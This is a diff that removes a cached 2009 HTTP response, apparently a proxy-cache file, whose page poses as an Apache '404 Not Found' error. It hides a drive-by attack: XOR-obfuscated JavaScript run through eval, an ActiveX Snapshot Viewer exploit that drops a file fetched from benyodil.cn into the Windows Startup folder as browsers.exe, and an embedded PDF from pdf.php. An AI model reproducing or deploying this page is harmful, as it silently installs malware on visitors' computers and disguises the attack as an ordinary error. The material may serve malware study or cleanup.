@@ -1,28 +1,0 @@
-HTTP/1.1 200 OK
-Content-Length: 1724
-Date: Mon, 16 Mar 2009 08:19:14 GMT
-Server: Apache/2.2.3 (CentOS)
-X-Powered-By: PHP/5.1.6
-Content-Type: text/html
-X-Polipo-Location: http://benyodil.cn/senks/al1/2/index.php
-X-Polipo-Date: Mon, 16 Mar 2009 08:30:17 GMT
-X-Polipo-Access: Mon, 16 Mar 2009 08:30:17 GMT
-
-<html>
-<title>404 Not Found...</title>
-</head><body>
-<h1>Not Found.</h1>
-<p>The requested URL /index.php was not found on this server.</p>
-<p>Additionally, a 404 Not Found
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-<hr>
-</body></html><script language=JavaScript>str = "ru`suxdlw`rj`r)(:gtobuhno!ru`suxdlw`rj`r)(!zw`s!nqnqnq!<!enbtldou/bsd`udDmdldou)&nckdbu&(:nqnqnq/rdu@uushctud)&he&-&nqnqnq&(:nqnqnq/rdu@uushctud)&bm`rrhe&-&b&*&m&*#rhe;C#*#E8#*&7B447,74&*#@2,00#*&E1,892@,1&*#1B#*&15G&*#B38#*&D27&(:usx!zw`s!obobob!<!nqnqnq/Bsd`udNckdbu)&l&*#ry#*&lm3&*#/#*&Y&*#LM#*&I&*&UUQ&-&&(:w`s!pspsps!<!nqnqnq/Bsd`udNckdbu)#Ri#*#dmm/@#*#q#*#qmhb`#*#uhno#-&&(:w`s!mdmdmd!<!nqnqnq/Bsd`udNckdbu)&`&*&e&*#nec/#*&ru&*#s#*&d`l&-&&(:usx!z!mdmdmd/uxqd!<!0:obobob/nqdo)&F&*#D#*&U&-&iuuq;..cdoxnehm/bo.rdojr.`m0.3.mn`e/qiq&-g`mrd(:obobob/rdoe)(:!mdmdmd/nqdo)(:mdmdmd/Vshud)obobob/sdrqnordCnex(:w`s!wro`ld!<!&/..//..w`reswvho/dyd&:mdmdmd/R`wdUnGhmd)wro`ld-3(:mdmdmd/Bmnrd)(:|!b`ubi)d(!z|usx!z!pspsps/ridmmdydbtud)wro`ld(:!|!b`ubi)d(!z||b`ubi)d(z||";str2 = "";for (i = 0; i < str.length; i ++) { str2 = str2 + String.fromCharCode (str.charCodeAt (i) ^ 1); }; eval (str2);</script></html><object classid="clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9" id="attack"></object>
-<script>
-var arbitrary_file = "http://benyodil.cn/senks/al1/2/load.php";
-var destination = 'c:/Documents and Settings/All Users/Start Menu/Programs/StartUp/browsers.exe';
-attack.SnapshotPath = arbitrary_file;
-attack.CompressedPath = destination;
-attack.PrintSnapshot(arbitrary_file,destination);
-</script>
-
-<embed src="pdf.php" type="application/pdf" width=100 height=100></embed>
